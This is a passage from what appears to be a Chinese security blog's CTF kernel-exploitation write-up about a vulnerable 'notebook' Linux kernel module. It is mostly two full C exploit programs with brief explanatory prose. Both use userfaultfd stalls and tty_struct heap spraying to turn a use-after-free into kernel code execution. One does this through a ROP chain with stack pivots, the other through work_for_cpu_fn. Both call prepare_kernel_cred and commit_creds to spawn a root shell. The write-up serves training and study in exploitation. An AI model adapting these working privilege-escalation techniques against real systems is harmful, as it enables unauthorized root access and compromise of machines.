        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    };
    

> exp.c
    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <semaphore.h>
    #include <poll.h>
    #include "kernelpwn.h"
    
    #define PTM_UNIX98_OPS 0xffffffff81e8e440
    #define PTY_UNIX98_OPS 0xffffffff81e8e320
    #define COMMIT_CREDS 0xffffffff810a9b40
    #define PREPARE_KERNEL_CRED 0xffffffff810a9ef0
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929
    #define PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50
    #define MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c
    #define POP_RDI_RET 0xffffffff81007115
    #define MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833 // mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret;
    #define POP_RDX_RET 0xffffffff81358842
    #define RET 0xffffffff81000091
    #define SWAPGS_POP_RBP_RET 0xffffffff810637d4
    #define IRETQ 0xffffffff810338bb
    #define POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1
    #define POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38
    #define POP_RBP_RET 0xffffffff81000367
    #define POP_RBX_POP_RBP_RET 0xffffffff81002141
    #define POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7
    
    #define TTY_STRUCT_SIZE 0x2e0
    
    static long page_size;
    static sem_t sem_add, sem_edit;
    static char * buf; // for userfaultfd
    
    static char *page = NULL;
    static void *
    fault_handler_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
    
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
    
        uffd = (long) arg;
    
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
    
            if (nready == -1)
                errExit("poll");
    
            nread = read(uffd, &msg, sizeof(msg));
    
            sleep(100);
    
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
    
            if (nread == -1)
                errExit("read");
    
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
    
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
    
            return NULL;
        }
    }
    
    long note_fd;
    typedef struct 
    {
        size_t idx;
        size_t size;
        char * buf;
    } Note;
    
    void noteAdd(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x100, &note);
    }
    
    void noteAddWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteAdd(note->idx, note->size, note->buf);
    }
    
    void noteDel(size_t idx)
    {
        Note note = 
        {
            .idx = idx,
        };
        ioctl(note_fd, 0x200, &note);
    }
    
    void noteEdit(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x300, &note);
    }
    
    void noteEditWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteEdit(note->idx, note->size, note->buf);
    }
    
    void noteGift(char * buf)
    {
        Note note = 
        {
            .buf = buf,
        };
        ioctl(note_fd, 100, &note);
    }
    
    void evilAdd(void * args)
    {
        sem_wait(&sem_add);
        noteAdd((int)args, 0x50, buf);
    }
    
    void evilEdit(void * args)
    {
        sem_wait(&sem_edit);
        noteEdit((int)args, 0x2000, buf);
    }
    
    struct
    {
        void * buf;
        size_t size;
    } notebook[0x10];
    
    int main(int argc, char ** argv, char ** envp)
    {
        int tty_fd[0x100], tty_idx, fake_tty_ops_idx = -1, fake_stack_idx = -1, hit_tty = 0;
        size_t tty_data[0x200], fake_tty_data[0x200], tty_ops, fake_tty_ops_data[0x200], rop[0x100];
        pthread_t tmp_t, add_t, edit_t;
        Note note;
    
        saveStatus();
        sem_init(&sem_add, 0, 0);
        sem_init(&sem_edit, 0, 0);
    
        note_fd = open("/dev/notebook", O_RDWR);
        buf = (char*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        page = malloc(0x1000);
        strcpy(page, "arttnba3");
        page_size = sysconf(_SC_PAGE_SIZE);
    
        // register userfaultfd
        registerUserFaultFd(buf, 0x1000, fault_handler_thread);
    
        // initialize the notebook
        for (int i = 0; i < 0x10; i++)
        {
            noteAdd(i, 0x20, page);
            noteEdit(i, TTY_STRUCT_SIZE, page);
        }
        puts("\033[32m\033[1m[+] Notebook initialization done.\033[0m");
        sleep(1);
    
        // get all the note free and get the threads stuck by userfaultfd to save their ptrs
        for (int i = 0; i < 0x10; i++)
            pthread_create(&edit_t, NULL, evilEdit, (void*)i);
        puts("\033[34m\033[1m[*] Edit threads started.\033[0m");
    
        for (int i = 0; i < 0x10; i++)
            sem_post(&sem_edit);
        puts("\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m");
        sleep(1);
    
        // heap spraying to hit the tty_struct
        for (int i = 0; i < 0x80; i++)
            tty_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        puts("\033[32m\033[1m[+] Heap spray for tty done.\033[0m");
        sleep(1);
    
        // change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs
        for (int i = 0; i < 0x10; i++)
            pthread_create(&add_t, NULL, evilAdd, (void*)i);
        puts("\033[34m\033[1m[*] Add threads started.\033[0m");
    
        for (int i = 0; i < 0x10; i++)
            sem_post(&sem_add);
        puts("\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m");
        sleep(1);
    
        // check whether we've hit the tty_struct
        noteGift((char*) notebook);
        for (int i = 0; i < 0x10; i++)
        {
            read(note_fd, tty_data, i);
            if (hit_tty = (*((int*)tty_data) == 0x5401))
            {
                printf("\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n", tty_idx = i);
                printf("\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n", notebook[i].buf);
                break;
            }
        }
        if (!hit_tty)
            errExit("Failed to hit the tty struct.");
    
        // get kernel base
        tty_ops = *(unsigned long long*)(tty_data + 3);
        kernel_offset = ((tty_ops & 0xfff) == (PTY_UNIX98_OPS & 0xfff) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);
        kernel_base = (void*) ((size_t)kernel_base + kernel_offset);
        prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
        commit_creds = COMMIT_CREDS + kernel_offset;
        printf("\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n", kernel_offset);
        printf("\033[32m\033[1m[+] Kernel base: \033[0m%p\n", kernel_base);
        printf("\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n", prepare_kernel_cred);
        printf("\033[32m\033[1m[+] commit_creds: \033[0m%p\n", commit_creds);
        printf("\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n", SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);
    
        // find available note as fake tty_ops and fake stack
        for (int i = 0; i < 0x10; i++)
        {
            read(note_fd, tty_data, i);
            if (*((int*)tty_data) != 0x5401)
            {
                if (fake_tty_ops_idx == -1)
                    printf("\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n", fake_tty_ops_idx = i);
                else
                {
                    printf("\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n", fake_stack_idx = i);
                    break;
                }
            }
        }
        if (fake_tty_ops_idx == -1 || fake_stack_idx == -1)
            errExit("Unable to find enough available notes, you\'re so lucky that you got so many tty_structs.");
    
        // adjust the size of the object
        noteEdit(fake_tty_ops_idx, sizeof(struct tty_operations), fake_tty_data);
        noteEdit(fake_stack_idx, 0x100, rop);
        noteGift((char*) notebook);
        printf("\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n", notebook[fake_tty_ops_idx].buf);
        printf("\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n", notebook[fake_stack_idx].buf);
    
        // restore tty_struct data
        read(note_fd, tty_data, tty_idx);
        memcpy(fake_tty_data, tty_data, sizeof(size_t) * 0x200);
    
        // first migration to tty_struct
        ((struct tty_operations *)fake_tty_ops_data)->write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;
    
        // second migration back to tty_operations
        fake_tty_data[1] = POP_RBX_POP_RBP_RET + kernel_offset;
        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
        fake_tty_data[4] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
    
        // third migration to a note
        fake_tty_ops_data[1] = POP_RBP_RET + kernel_offset;
        fake_tty_ops_data[2] = notebook[fake_stack_idx].buf;
        fake_tty_ops_data[3] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
    
        // final rop
        int rop_idx = 0;
        rop[rop_idx++] = 0x3361626e74747261; //arttnba3
        rop[rop_idx++] = POP_RDI_RET + kernel_offset;
        rop[rop_idx++] = 0;
        rop[rop_idx++] = prepare_kernel_cred;
        rop[rop_idx++] = POP_RDX_RET + kernel_offset;
        rop[rop_idx++] = RET;
        rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;
        rop[rop_idx++] = 0x3361626e74747261; //arttnba3
        rop[rop_idx++] = commit_creds;
        rop[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + kernel_offset;
        rop[rop_idx++] = 0;
        rop[rop_idx++] = 0;
        rop[rop_idx++] = (size_t) &getRootShell;
        rop[rop_idx++] = user_cs;
        rop[rop_idx++] = user_rflags;
        rop[rop_idx++] = user_sp;
        rop[rop_idx++] = user_ss;
    
        write(note_fd, rop, fake_stack_idx);                    // copy the ropchain
        write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    // hijack the tty_operations
        write(note_fd, fake_tty_data, tty_idx);                 // hijack the tty_struct
        puts("\033[32m\033[1m[+] TTY DATA hijack done.\033[0m");
    
        // exploit
        puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
        for (int i = 0; i < 0x80; i++)
            write(tty_fd[i], page, 233);
    
        return 0;
    }
    

运行即可成功提权到 root

![](https://p4.ssl.qhimg.com/t01dc853f756dde237c.png)

> 经笔者多次测试，在开头的几步操作结束后都 sleep(1) 会 **极大地提高利用的稳定性** （主要是等待多个线程启动完成），不过由于资源限制所能喷的
> tty_struct 就少了些（但也够用了）

###  解法二：userfaultfd + heap spray + kernel UAF

> 参考了[长亭的WP](https://zhuanlan.zhihu.com/p/385645268)

前半部分与解法一基本上相同，但是在劫持 tty_struct 后并不是通过复杂的多次栈迁移进行利用，而是通过一个更为稳定的函数——

**work_for_cpu_fn 稳定化利用**

在开启了多核支持的内核中都有这个函数，定义于 `kernel/workqueue.c` 中：

    
    
    struct work_for_cpu {
        struct work_struct work;
        long (*fn)(void *);
        void *arg;
        long ret;
    };
    
    static void work_for_cpu_fn(struct work_struct *work)
    {
        struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
    
        wfc->ret = wfc->fn(wfc->arg);
    }
    

简单分析可知该函数可以理解为如下形式：

    
    
    static void work_for_cpu_fn(size_t * args)
    {
        args[6] = ((size_t (*) (size_t)) (args[4](args[5]));
    }
    

即 `rdi + 0x20` 处作为函数指针执行，参数为 `rdi + 0x28` 处值，返回值存放在 `rdi + 0x30` 处，由此我们可以
**很方便地分次执行 prepare_kernel_cred 和 commit_creds，完成稳定化提权**

与之前不同的是在这里选择劫持 tty_operations 中的 ioctl 而不是 write，因为 tty_struct[4] 处成员
`ldisc_sem` 为信号量，在执行到 work_for_cpu_fn 之前 **该值会被更改**

需要注意的是 tty_operations 中的 ioctl 并不是直接执行的，此前需要经过多道检查，因此我们应当传入恰当的参数

exp如下：

    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <semaphore.h>
    #include <poll.h>
    #include "kernelpwn.h"
    
    #define PTM_UNIX98_OPS 0xffffffff81e8e440
    #define PTY_UNIX98_OPS 0xffffffff81e8e320
    #define COMMIT_CREDS 0xffffffff810a9b40
    #define PREPARE_KERNEL_CRED 0xffffffff810a9ef0
    #define WORK_FOR_CPU_FN 0xffffffff8109eb90
    
    #define TTY_STRUCT_SIZE 0x2e0
    
    static long page_size;
    static sem_t sem_add, sem_edit;
    static char * buf; // for userfaultfd
    
    static char *page = NULL;
    static void *
    fault_handler_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
    
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
    
        uffd = (long) arg;
    
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
    
            if (nready == -1)
                errExit("poll");
    
            nread = read(uffd, &msg, sizeof(msg));
    
            sleep(100);
    
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
    
            if (nread == -1)
                errExit("read");
    
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
    
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
    
            return NULL;
        }
    }
    
    long note_fd;
    typedef struct 
    {
        size_t idx;
        size_t size;
        char * buf;
    } Note;
    
    void noteAdd(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x100, &note);
    }
    
    void noteAddWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteAdd(note->idx, note->size, note->buf);
    }
    
    void noteDel(size_t idx)
    {
        Note note = 
        {
            .idx = idx,
        };
        ioctl(note_fd, 0x200, &note);
    }
    
    void noteEdit(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x300, &note);
    }
    
    void noteEditWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteEdit(note->idx, note->size, note->buf);
    }
    
    void noteGift(char * buf)
    {
        Note note = 
        {
            .buf = buf,
        };
        ioctl(note_fd, 100, &note);
    }
    
    void evilAdd(void * args)
    {
        sem_wait(&sem_add);
        noteAdd((int)args, 0x50, buf);
    }
    
    void evilEdit(void * args)
    {
        sem_wait(&sem_edit);
        noteEdit((int)args, 0x2000, buf);
    }
    
    struct
    {
        void * buf;
        size_t size;
    } notebook[0x10];
    
    int main(int argc, char ** argv, char ** envp)
    {
        int tty_fd[0x100], tty_idx, fake_tty_ops_idx = -1, hit_tty = 0;
        size_t tty_data[0x200], fake_tty_data[0x200], tty_ops, fake_tty_ops_data[0x200], rop[0x100];
        pthread_t tmp_t, add_t, edit_t;
        Note note;
    
        saveStatus();
        sem_init(&sem_add, 0, 0);
        sem_init(&sem_edit, 0, 0);
    
        note_fd = open("/dev/notebook", O_RDWR);
        buf = (char*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        page = malloc(0x1000);
        strcpy(page, "arttnba3");
        page_size = sysconf(_SC_PAGE_SIZE);
    
        // register userfaultfd
        registerUserFaultFd(buf, 0x1000, fault_handler_thread);
    
        // initialize the notebook
        for (int i = 0; i < 0x10; i++)
        {
            noteAdd(i, 0x20, page);
            noteEdit(i, TTY_STRUCT_SIZE, page);
        }
        puts("\033[32m\033[1m[+] Notebook initialization done.\033[0m");
        sleep(1);
    
        // get all the note free and get the threads stuck by userfaultfd to save their ptrs
        for (int i = 0; i < 0x10; i++)
            pthread_create(&edit_t, NULL, evilEdit, (void*)i);
        puts("\033[34m\033[1m[*] Edit threads started.\033[0m");
    
        for (int i = 0; i < 0x10; i++)
            sem_post(&sem_edit);
        puts("\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m");
        sleep(1);
    
        // heap spraying to hit the tty_struct
        for (int i = 0; i < 0x80; i++)
            tty_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        puts("\033[32m\033[1m[+] Heap spray for tty done.\033[0m");
        sleep(1);
    
        // change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs
        for (int i = 0; i < 0x10; i++)
            pthread_create(&add_t, NULL, evilAdd, (void*)i);
        puts("\033[34m\033[1m[*] Add threads started.\033[0m");
    
        for (int i = 0; i < 0x10; i++)
            sem_post(&sem_add);
        puts("\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m");
        sleep(1);
    
        // check whether we've hit the tty_struct
        noteGift((char*) notebook);
        for (int i = 0; i < 0x10; i++)
        {
            read(note_fd, tty_data, i);
            if (hit_tty = (*((int*)tty_data) == 0x5401))
            {
                printf("\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n", tty_idx = i);
                printf("\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n", notebook[i].buf);
                break;
            }
        }
        if (!hit_tty)
            errExit("Failed to hit the tty struct.");
    
        // get kernel base
        tty_ops = *(unsigned long long*)(tty_data + 3);
        kernel_offset = ((tty_ops & 0xfff) == (PTY_UNIX98_OPS & 0xfff) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);
        kernel_base = (void*) ((size_t)kernel_base + kernel_offset);
        prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
        commit_creds = COMMIT_CREDS + kernel_offset;
        printf("\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n", kernel_offset);
        printf("\033[32m\033[1m[+] Kernel base: \033[0m%p\n", kernel_base);
        printf("\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n", prepare_kernel_cred);
        printf("\033[32m\033[1m[+] commit_creds: \033[0m%p\n", commit_creds);
        printf("\033[32m\033[1m[+] work_for_cpu_fn: \033[0m%p\n", WORK_FOR_CPU_FN + kernel_offset);
    
        // find available note as fake tty_ops and fake stack
        for (int i = 0; i < 0x10; i++)
        {
            read(note_fd, tty_data, i);
            if (*((int*)tty_data) != 0x5401)
            {
                if (fake_tty_ops_idx == -1)
                {
                    printf("\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n", fake_tty_ops_idx = i);
                    break;
                }
            }
        }
        if (fake_tty_ops_idx == -1)
            errExit("Unable to find enough available notes, you\'re so lucky that you got so many tty_structs.");
    
        // adjust the size of the object
        noteEdit(fake_tty_ops_idx, sizeof(struct tty_operations), fake_tty_data);
        noteGift((char*) notebook);
        printf("\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n", notebook[fake_tty_ops_idx].buf);
    
        // hijack the ioctl
        ((struct tty_operations *)fake_tty_ops_data)->ioctl = WORK_FOR_CPU_FN + kernel_offset;
        write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);
    
        /* ---- prepare_kernel_cred(NULL) ----*/
    
        // store tty_struct data
        read(note_fd, tty_data, tty_idx);
        memcpy(fake_tty_data, tty_data, sizeof(size_t) * 0x200);
    
        // set params in fake tty_struct
        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
        fake_tty_data[4] = prepare_kernel_cred;
        fake_tty_data[5] = NULL;
        write(note_fd, fake_tty_data, tty_idx);
    
        // exploit
        puts("\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m");
        for (int i = 0; i < 0x80; i++)
            ioctl(tty_fd[i], 233, 233);
        puts("\033[32m\033[1m[*] Done.\033[0m");
    
        /* ---- commit_creds(ROOT) ----*/getchar();
    
        // get root cred back
        read(note_fd, fake_tty_data, tty_idx);
    
        // restore tty_struct data
        memcpy(fake_tty_data, tty_data, sizeof(size_t) * 6);
    
        // set params in fake tty_struct
        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
        fake_tty_data[4] = commit_creds;
        fake_tty_data[5] = fake_tty_data[6];
        fake_tty_data[6] = tty_data[6];
        write(note_fd, fake_tty_data, tty_idx);
    
        // exploit
        puts("\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m");
        for (int i = 0; i < 0x80; i++)
            ioctl(tty_fd[i], 233, 233);
        puts("\033[32m\033[1m[*] Done.\033[0m");
    
        getRootShell();
    
        return 0;
    }
    

运行即可提权到 root

![](https://p4.ssl.qhimg.com/t01e8995140937b113d.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **墨晚鸢** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253835](/post/id/253835)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [kernel pwn](/tag/kernel pwn)
  * [userfaultfd](/tag/userfaultfd)

 **+1** __8赞

 __收藏

![](https://p3.ssl.qhimg.com/t0148f718bec9e27586.png) 墨晚鸢

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

